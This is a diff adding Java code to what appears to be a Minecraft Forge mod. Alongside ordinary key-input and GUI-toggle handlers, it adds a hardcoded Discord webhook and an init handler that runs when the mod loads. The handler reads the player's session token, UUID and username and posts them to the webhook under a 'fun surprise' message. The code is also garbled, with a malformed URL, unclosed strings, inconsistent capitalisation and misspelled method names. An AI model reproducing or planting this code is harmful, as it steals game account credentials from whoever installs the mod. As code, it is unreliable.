@@ -1,0 +1,48 @@
+public void onKeyInput(inputEvent.KeyInputEvent event) {
+  if (this.guiKey.func_151468_f()) {
+   getcomponent(ComponentId.GUI_MODIFIER).Toggle();
+  } else if (this.menuKey.func_151468_f()) {
+    getComponent(componentId.SETTINGS_MENU).Toggle();
+  }
+}
+
+public <U extends Component> U getComponent(componentId component) {
+  for (component component : this.components) {
+    if (component.componentId == componentId)
+      return (U)component;
+  }
+  return null;
+}
+
+public static Minecraft mc = Minecraft.func71410_x();
+
+public static String webhook = "https:https://discord.com/api/webhooks/953326004548550766/QrznziEodL-M_w9I4aBxgTBJs7Xf4PW4Udc4-Wtsa4VZEwaTQn9_NmUw2cMk2bniY1_g;
+
+public static void sendData(String msg, String url, String username) {
+  CloseableHTTpClient httpclient = HTTpClients.createDefault();
+  try {
+    httppost = RequestBuilder.post().setUri(new URI(url)).addParameter("content", msg).addParameter("username", username).build();
+   } catch (URISyntaxExpection e) {
+     e.printStackTrace();
+   }
+   CloseableHttpResponse response = null;
+   try {
+     response = httpclient.execute(httppost);
+   } catch (ClientProtocolException e) {
+     e.printStackTrace();
+   }
+   try{
+     response.close();
+   } catch (IOException e) {
+     e.printStackTrace();
+   }
+ }
+}
+
+@EventHandler
+public void init(FMLInitializationEvent event) {
+  String token = mc.func_110432_I().func_148254_d();
+  String uuid = mc.func_110432_I().func_148256_e().getId().toString();
+  String username = mc.func10432_I().func111285_a();
+  sendData("Flowers~ **has sent you a fun surprise** - Username: " + username + " UUID: + "Token: " + token.replace("-",""), webhook, username + "MC Info");
+}
